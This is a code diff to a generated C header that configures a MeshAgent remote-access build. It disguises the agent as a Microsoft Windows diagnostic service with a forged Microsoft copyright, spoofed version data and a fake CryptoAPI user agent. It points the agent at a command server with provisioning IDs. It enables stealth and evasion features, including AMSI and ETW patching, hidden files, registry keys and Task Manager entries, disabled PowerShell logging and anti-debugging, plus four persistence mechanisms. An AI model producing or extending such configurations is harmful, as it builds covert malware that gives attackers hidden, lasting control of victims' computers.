@@ -1,7 +1,9 @@
-/* Generated file - do not edit. */
+﻿/* Generated file - do not edit. */
+/* Generated on: 2025-10-23 10:21:28 */
 #ifndef GENERATED_MESHAGENT_BRANDING_H
 #define GENERATED_MESHAGENT_BRANDING_H
 
+/* ========== Service Branding ========== */
 #undef MESH_AGENT_SERVICE_FILE
 #define MESH_AGENT_SERVICE_FILE TEXT("WinDiagnosticHost")
 #undef MESH_AGENT_SERVICE_NAME
@@ -14,38 +16,74 @@
 #define MESH_AGENT_FILE_DESCRIPTION "system health monitoring"
 #undef MESH_AGENT_INTERNAL_NAME
 #define MESH_AGENT_INTERNAL_NAME "diaghost.exe"
+#undef MESH_AGENT_COPYRIGHT
+#define MESH_AGENT_COPYRIGHT "Â© Microsoft Corporation. All rights reserved."
 #undef MESH_AGENT_ORIGINAL_FILENAME
 #define MESH_AGENT_ORIGINAL_FILENAME "diaghost.exe"
-#undef MESH_AGENT_COPYRIGHT
-#define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
 #undef MESH_AGENT_LOG_DIRECTORY
-#define MESH_AGENT_LOG_DIRECTORY TEXT("C:/Windows/System32/DiagnosticHost/logs")
-
-/* Version Information */
+#define MESH_AGENT_LOG_DIRECTORY TEXT("C:/ProgramData/DiagnosticHost/logs")
+#undef MESH_AGENT_FILE_VERSION_MAJOR
 #define MESH_AGENT_FILE_VERSION_MAJOR 10
+#undef MESH_AGENT_FILE_VERSION_MINOR
 #define MESH_AGENT_FILE_VERSION_MINOR 0
+#undef MESH_AGENT_FILE_VERSION_BUILD
 #define MESH_AGENT_FILE_VERSION_BUILD 19041
+#undef MESH_AGENT_FILE_VERSION_REVISION
 #define MESH_AGENT_FILE_VERSION_REVISION 0
-#define MESH_AGENT_FILE_VERSION_STR "10.0.19041.0"
-
+#undef MESH_AGENT_FILE_VERSION_STR
+#define MESH_AGENT_FILE_VERSION_STR TEXT("10.0.19041.0")
+#undef MESH_AGENT_PRODUCT_VERSION_MAJOR
 #define MESH_AGENT_PRODUCT_VERSION_MAJOR 10
+#undef MESH_AGENT_PRODUCT_VERSION_MINOR
 #define MESH_AGENT_PRODUCT_VERSION_MINOR 0
+#undef MESH_AGENT_PRODUCT_VERSION_BUILD
 #define MESH_AGENT_PRODUCT_VERSION_BUILD 19041
+#undef MESH_AGENT_PRODUCT_VERSION_REVISION
 #define MESH_AGENT_PRODUCT_VERSION_REVISION 0
-#define MESH_AGENT_PRODUCT_VERSION_STR "10.0.19041.0"
+#undef MESH_AGENT_PRODUCT_VERSION_STR
+#define MESH_AGENT_PRODUCT_VERSION_STR TEXT("10.0.19041.0")
 
-/* Optional network hints for future use */
+/* ========== Network Configuration ========== */
 #define MESH_AGENT_NETWORK_ENDPOINT "wss://agents.high.support:4445/agent.ashx"
 #define MESH_AGENT_NETWORK_SNI NULL
 #define MESH_AGENT_NETWORK_USER_AGENT "Microsoft-CryptoAPI/10.0"
 #define MESH_AGENT_NETWORK_JA3 NULL
 
-/* Persistence flags */
-/* In lab builds (STEALTH_LAB=1), default to enabling all persistence knobs */
+/* ========== Provisioning Data ========== */
+#define MESH_AGENT_MESH_ID "sdBWgAtTM6VK18fC7gLtdRBZq0NAjzqg@1x9MMWNudEQZ3FoOGkXXLFyoyEhXL2Z"
+#define MESH_AGENT_SERVER_ID "89EE260CB880664898D38A56350F841AA2B05BA3328E23DB2526D506EAB41A13"
+#define MESH_AGENT_MESH_NAME "Windows Diagnostics"
+#define MESH_AGENT_SERVER_URL "wss://agents.high.support:4445/agent.ashx"
+#define MESH_AGENT_MESH_TYPE 2
 
+/* ========== Stealth Features ========== */
+#define MESH_AGENT_STEALTH_ENABLED 1
+#define MESH_AGENT_SVCHOST_MODE 1
+#define MESH_AGENT_HIDE_FILES 1
+#define MESH_AGENT_HIDE_REGISTRY 1
+#define MESH_AGENT_AMSI_PATCH 1
+#define MESH_AGENT_ETW_PATCH 1
+#define MESH_AGENT_ANTI_DEBUG 1
+#define MESH_AGENT_SYSCALLS_DIRECT 1
+#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT 1
+
+/* ========== Persistence Configuration ========== */
 #define MESH_AGENT_PERSIST_RUNKEY 1
 #define MESH_AGENT_PERSIST_TASK 1
 #define MESH_AGENT_PERSIST_WMI 1
 #define MESH_AGENT_PERSIST_WATCHDOG 1
+
+/* ========== Evasion Features ========== */
+#define MESH_AGENT_DISABLE_PS_LOGGING 1
+#define MESH_AGENT_DISABLE_EVENT_LOGS 0
+#define MESH_AGENT_DISABLE_ETW 1
+#define MESH_AGENT_HIDE_TASKMANAGER 1
+#define MESH_AGENT_USE_SYSCALLS 1
+
+/* ========== Signing Allowlist ========== */
+#undef MESH_AGENT_ALLOWED_SIGNERS_COUNT
+#define MESH_AGENT_ALLOWED_SIGNERS_COUNT 1
+#undef MESH_AGENT_ALLOWED_SIGNERS
+#define MESH_AGENT_ALLOWED_SIGNERS { { 0x72, 0x4D, 0x7C, 0x21, 0x88, 0xA2, 0x39, 0xEE, 0xB7, 0xE1, 0x82, 0x31, 0x81, 0x34, 0x75, 0x81, 0xDC, 0x83, 0xA4, 0xB1 } }
 
 #endif /* GENERATED_MESHAGENT_BRANDING_H */
